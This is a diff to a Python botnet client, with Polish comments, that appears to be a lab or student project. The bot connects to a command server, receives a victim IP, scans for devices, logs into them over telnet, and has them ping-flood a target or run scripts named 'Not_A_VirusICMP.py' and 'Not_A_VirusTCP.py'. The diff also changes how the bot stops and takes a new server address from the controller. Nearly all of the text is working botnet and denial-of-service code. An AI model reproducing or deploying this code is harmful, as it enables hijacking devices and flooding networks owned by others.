@@ -2,15 +2,11 @@ import socket
 import time
 import telnetlib
 # przekazac kopię
-# from requests import get       ->       można publiczny ip używać    w sumie nie wiem po co xD
+# from requests import get       ->       można publiczny ip używać    w sumie nie wiem po co
 from _thread import start_new_thread
 
 attack = False
 
-
-# todo: zrobić przerwanie ataku idk jak ( można odczytywać zmienną globalną, a w mainie wątek ktory odczytuje tą
-#  zmienną? w sumie wystarczy w funkcjach )
-#
 
 def telnetConnect(ip_address, victimIP, attackType: int):
     # można zrobić pętlę do wczytywania user credentials z pliku
@@ -47,7 +43,7 @@ def telnetConnect(ip_address, victimIP, attackType: int):
             if attackType == 1:  # note
                 print('pingujemy..')
                 tn.write(b"ping 192.168.100.7\n")  # można zrobić wątki
-                if not attack:                     # tu też
+                if not attack:  # tu też
                     print("stopping attack")
                     return
                 time.sleep(60)
@@ -59,13 +55,12 @@ def telnetConnect(ip_address, victimIP, attackType: int):
                 # print(tn.write(b"python Not_A_VirusICMP.py"))
                 # file.close()
 
-                if not attack:      #zrobić wątek sprawdzający czy przerwac atatak thread()
-                    print(tn.write(b"exit"))  # jak wyjść z wykonującego sie skryptu?!?!
-                    # tn.write(telnetlib.IP)  # chyba tak
+                if not attack:  # zrobić wątek sprawdzający czy przerwac atatak thread()
+                    # print(tn.write(b"exit"))  # jak wyjść z wykonującego sie skryptu?!?!
+                    tn.write(telnetlib.IP)  # chyba tak
                     return
 
-                    # tn.write(b"exit\n")
-
+                tn.write(b"exit\n")
 
                 # print(tn.read_all().decode('ascii'))
 
@@ -80,7 +75,6 @@ def telnetConnect(ip_address, victimIP, attackType: int):
                 print(tn.write(b"python Not_A_VirusTCP.py"))
                 file.close()
                 if not attack:
-
                     print(tn.write(b"exit"))  # jak wyjść z wykonującego sie skryptu?!?!
                     # tn.write(telnetlib.IP)  # chyba tak
                     return
@@ -110,34 +104,33 @@ def checkForOtherDevices(ip, victimIP):
     print('finished')
 
 
-
-
 if __name__ == '__main__':
 
-    HOST = '192.168.100.11'  # The server's hostname or IP address
+    #HOST = '192.168.100.11'  # The server's hostname or IP address
+    HOST = '127.0.0.1'
     PORT = 65432  # The port used by the server
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        flag = 0
+        connected = 0
         while True:
-
-            if flag == 1:
+            # connected == 1 -> bot is connected
+            # connected == 0 -> bot is disconnected
+            if connected == 1:
                 continue
 
-            while flag != 1:
+            while connected != 1:
                 time.sleep(0.5)
                 try:
-                    print('trying to connect...')
+                    print('trying to connect... ')
                     s.connect((HOST, PORT))
-                    # send info to host that a bot is connected
+                    # send info to server that a bot is connected
                     s.send('1'.encode())
-                    # checkForOtherDevices(HOST)
-                    flag = 1
+                    connected = 1
                 except:
-                    print('nie udało sie połączyć')
+                    print("couldn't connect to: "+HOST)
                     s.close()
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    flag = 0
+                    connected = 0
                     continue
                 time.sleep(1)
                 print("Connection established!")
@@ -145,31 +138,20 @@ if __name__ == '__main__':
                 data = str(s.recv(1).decode())
                 print('Received', str(data))
                 if str(data) == '1':
-
-                    victim_ip = str(s.recv(1024).decode())
+                    victim_ip = str(s.recv(16).decode())
                     print('victim address:' + str(victim_ip))
                     checkForOtherDevices(HOST, victim_ip)
                     attack = True
-                elif data == 2:  # dostan nowe ip serwera
-
-                    HOST = s.recv(1024)
-                    s.close()
-                    flag = 0
-                    continue
                 else:
                     print('something went wrong')
 
-                # zrobić try zeby sie nie wywalilo
+                # todo:zrobić try zeby sie nie wywalilo
                 stop = str(s.recv(1).decode())
                 if stop == '0':
                     attack = False
-                    print("Stoping")
-                    flag=0
+                    print("Stopping")
+                    HOST = str(s.recv(16).decode())
+                    connected = 0
                 time.sleep(5)
             except:
-                flag=0
-            # ip = get('https://api.ipify.org').text
-            # print('public IP address: {}'.format(ip))
-            # print('operating port: {}'.format(PORT))
-
-            # print('Received', str(data))
+                connected = 0
